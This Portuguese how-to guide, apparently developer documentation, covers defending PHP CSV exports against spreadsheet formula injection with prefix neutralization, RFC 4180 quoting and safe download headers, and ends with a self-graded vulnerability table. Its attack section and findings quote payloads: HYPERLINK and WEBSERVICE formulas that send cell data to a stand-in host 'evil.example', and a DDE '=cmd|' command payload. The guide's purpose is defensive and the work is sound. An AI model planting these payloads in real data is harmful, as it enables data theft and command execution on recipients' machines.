# Como Fazer: Prevenir Injeção de Fórmula em CSV / Planilha na Exportação

Quando sua API exporta dados fornecidos pelo usuário como CSV, o perigo não está no seu servidor — está na **planilha do destinatário**. Excel, Google Sheets e LibreOffice tratam uma célula cujo texto começa com `=`, `+`, `-`, `@`, uma tabulação (`\t`) ou um carriage return (`\r`) como uma **fórmula**. Um atacante que consiga inserir uma string como `=cmd|'/c calc'!A0` ou `=HYPERLINK("https://evil.example/?"&A1)` no seu banco de dados fará com que ela execute (DDE) ou exfiltre a linha quando um administrador abrir o arquivo exportado.

Isso é **injeção de CSV** (também conhecida como injeção de fórmula). É um problema de *codificação de saída* na fronteira de exportação — distinto de [SQL injection](sql-injection.md) (um problema de query) e de [CSV bulk import](csv-bulk-import.md) (um problema de entrada).

**Pré-requisito**: Você tem um endpoint que retorna linhas como CSV.

---

## 1. O ataque

Armazene isto como um "nome de exibição" perfeitamente válido, depois exporte a tabela para CSV e abra no Excel:

```
=HYPERLINK("https://evil.example/leak?d="&A1&A2, "Click for refund")
```

- `=...HYPERLINK...` — exfiltra células vizinhas para uma URL do atacante quando clicado.
- `=WEBSERVICE("https://evil.example/?"&A1)` — exfiltra **sem clique** em versões antigas do Excel.
- `=cmd|'/c calc'!A0` — DDE; pode rodar um comando local após um diálogo de confirmação.

Nada disso toca o seu servidor. Sua validação passou, seu SQL foi parametrizado — e você ainda assim entregou um exploit funcional dentro de um CSV "válido".

---

## 2. A correção: neutralizar o caractere inicial

A baseline recomendada pela OWASP: se um valor de célula começa com um caractere perigoso **e não é um número simples**, prefixe-o com uma aspa simples (`'`). O Excel então renderiza a célula como texto literal.

```php
/**
 * Neutralize a value before writing it to a CSV cell so spreadsheet
 * software cannot interpret it as a formula.
 */
function neutralizeCsvCell(string $value): string
{
    if ($value === '') {
        return $value;
    }
    $dangerous = ['=', '+', '-', '@', "\t", "\r"];
    // Keep genuine numbers (incl. negatives like -50) intact; only quote
    // values that *start* dangerous and are not numeric.
    if (in_array($value[0], $dangerous, true) && !is_numeric($value)) {
        return "'" . $value;
    }

    return $value;
}
```

A guarda `!is_numeric()` é a parte que a maioria das implementações erra: prefixar cegamente todo `-`/`+` transforma o número legítimo `-50` no texto `'-50`, quebrando somas na planilha do destinatário. Números passam direto; apenas strings com formato de fórmula são citadas.

---

## 3. Combine com a citação RFC 4180

A neutralização cuida das fórmulas; você ainda precisa de citação correta para que valores contendo vírgulas, aspas ou quebras de linha não quebrem a estrutura de colunas (um vetor de injeção separado). Deixe o `fputcsv` fazer isso, com `escape=""` para o comportamento estrito da [RFC 4180](https://www.rfc-editor.org/rfc/rfc4180) (sem escape com barra invertida):

```php
$fp = fopen('php://temp', 'r+');
foreach ($rows as $row) {
    fputcsv($fp, array_map('neutralizeCsvCell', $row), ',', '"', '');
}
rewind($fp);
$csv = stream_get_contents($fp);
```

Entrada → saída (verificado):

```
=1+1                       → '=1+1
+budget                    → '+budget
@home                      → '@home
-50                        → -50            (real number, untouched)
=cmd|'/c calc'!A0          → "'=cmd|'/c calc'!A0"
a,b                        → "a,b"
he said "hi"               → "he said ""hi"""
```

> `escape=""` importa: o caractere de escape histórico padrão do PHP (`\`) produz uma saída que **não** é RFC 4180 e que o Excel interpreta incorretamente. Sempre passe `""`.

---

## 4. Retorne como uma resposta de download

Construa a resposta PSR-7 no handler. Mais dois detalhes no nível de header importam:

```php
$filename = 'export-' . date('Ymd') . '.csv';

return $responseFactory->createResponse(200)
    ->withHeader('Content-Type', 'text/csv; charset=UTF-8')
    // Sanitize the filename: strip CR/LF/quotes so it cannot inject extra headers.
    ->withHeader('Content-Disposition', 'attachment; filename="'
        . preg_replace('/[\r\n"]/', '', $filename) . '"')
    ->withBody($streamFactory->createStream("\u{FEFF}" . $csv));
```

- **`Content-Disposition: attachment`** força um download em vez de deixar o navegador renderizar os bytes (defende contra content sniffing).
- **Sanitização do `filename`** — nunca interpole um nome controlado pelo usuário sem remover `\r`, `\n` e `"`; caso contrário, ele se torna um vetor de injeção de header.
- **BOM (`\u{FEFF}`)** — opcional; faz o Excel abrir UTF-8 corretamente. Não afeta a defesa contra injeção.

Mantenha a neutralização na camada de exportação (um pequeno value object `CsvWriter`), não espalhada pelos handlers — a mesma garantia então cobre todo endpoint de exportação.

---

## Avaliação de Vulnerabilidades

### V-01 — Injeção de fórmula via `=` inicial ✅ SAFE

**Risco**: Um valor armazenado como `=1+1` ou `=HYPERLINK(...)` executa quando o CSV é aberto.
**Descoberta**: SAFE — `neutralizeCsvCell()` prefixa `'`, então a célula é renderizada como texto (`'=1+1`).

---

### V-02 — Execução de comando DDE (`=cmd|...`) ✅ SAFE

**Risco**: `=cmd|'/c calc'!A0` aciona DDE e pode rodar um comando local.
**Descoberta**: SAFE — o payload começa com `=` e não é numérico, então é citado (`"'=cmd|'/c calc'!A0"`).

---

### V-03 — Exfiltração de dados via `WEBSERVICE`/`HYPERLINK` ✅ SAFE

**Risco**: `=WEBSERVICE("https://evil/?"&A1)` vaza células vizinhas, às vezes sem clique.
**Descoberta**: SAFE — neutralizado de forma idêntica; o `=` inicial é desarmado antes que o nome da função seja alcançado.

---

### V-04 — Gatilhos de `+`, `-`, `@` iniciais ✅ SAFE

**Risco**: O Excel também avalia células que começam com `+`, `-` e `@`.
**Descoberta**: SAFE — todos os quatro estão no conjunto `$dangerous`; `+budget` → `'+budget`, `@home` → `'@home`.

---

### V-05 — Bypass via prefixo de tabulação / carriage-return ✅ SAFE

**Risco**: Um `\t` ou `\r` inicial é removido por alguns parsers, expondo um `=` por baixo (`\t=1+1`).
**Descoberta**: SAFE — `\t` e `\r` estão eles próprios no conjunto `$dangerous`, então a célula inteira é citada antes de qualquer remoção.

---

### V-06 — Quebra de coluna via vírgula / aspas / quebra de linha ✅ SAFE

**Risco**: Um valor como `a,b` ou um `"`/quebra de linha embutido desloca dados para as colunas erradas (injeção estrutural).
**Descoberta**: SAFE — `fputcsv(..., escape: '')` aplica a citação RFC 4180 (`"a,b"`, `"he said ""hi"""`).

---

### V-07 — Injeção de header no filename do `Content-Disposition` ✅ SAFE

**Risco**: Um nome de exportação controlado pelo usuário contendo `\r\n` injeta headers de resposta adicionais.
**Descoberta**: SAFE — o filename passa por `preg_replace('/[\r\n"]/', '', ...)` antes de ser colocado no header.

---

### V-08 — Content sniffing / renderização inline ✅ SAFE

**Risco**: Sem `attachment`, um navegador pode renderizar o CSV como HTML e executar markup embutido.
**Descoberta**: SAFE — `Content-Type: text/csv` + `Content-Disposition: attachment` forçam um download.

---

### V-09 — Números negativos legítimos corrompidos ✅ SAFE (corretude)

**Risco**: A neutralização excessivamente zelosa transforma `-50` no texto `'-50`, corrompendo somas a jusante.
**Descoberta**: SAFE — a guarda `!is_numeric()` deixa números bem formados (`-50`, `+1`, `-5e3`) passarem intactos.

---

### V-10 — Centralização da defesa ✅ SAFE

**Risco**: A construção de CSV ad-hoc por handler permite que um endpoint esqueça a neutralização.
**Descoberta**: SAFE (por design) — a neutralização vive em uma única camada de exportação aplicada via `array_map`, então toda coluna de toda exportação é coberta.

---

### Resumo VULN

| ID | Vulnerabilidade | Descoberta |
|----|-----------------|------------|
| V-01 | Injeção de fórmula (`=`) | ✅ SAFE |
| V-02 | Execução de comando DDE | ✅ SAFE |
| V-03 | Exfiltração via `WEBSERVICE`/`HYPERLINK` | ✅ SAFE |
| V-04 | Gatilhos `+` / `-` / `@` | ✅ SAFE |
| V-05 | Bypass por prefixo de tabulação / CR | ✅ SAFE |
| V-06 | Quebra de coluna por vírgula / aspas / quebra de linha | ✅ SAFE |
| V-07 | Injeção de header no filename | ✅ SAFE |
| V-08 | Content sniffing / renderização inline | ✅ SAFE |
| V-09 | Corrupção de número negativo | ✅ SAFE |
| V-10 | Centralização da defesa | ✅ SAFE |

**10 SAFE, 0 EXPOSED.** Nenhuma descoberta crítica. A regra de neutralizar-o-caractere-inicial (com uma guarda numérica) somada à citação RFC 4180 e a uma resposta de download `attachment` fecha a superfície de injeção de CSV. A única ressalva residual é humana: o `'` neutralizador é visível como uma apóstrofe inicial em alguns parsers de CSV que não são planilhas — aceitável, já que a alternativa é a execução de código na planilha do destinatário.

---

## Relacionados

- [CSV bulk import](csv-bulk-import.md) — o lado da entrada (sucesso parcial, detecção de duplicatas)
- [Data export API](data-export-api.md) — fluxo de exportação assíncrono protegido por token
- [SQL injection defense](sql-injection.md) — a classe de injeção do lado da query
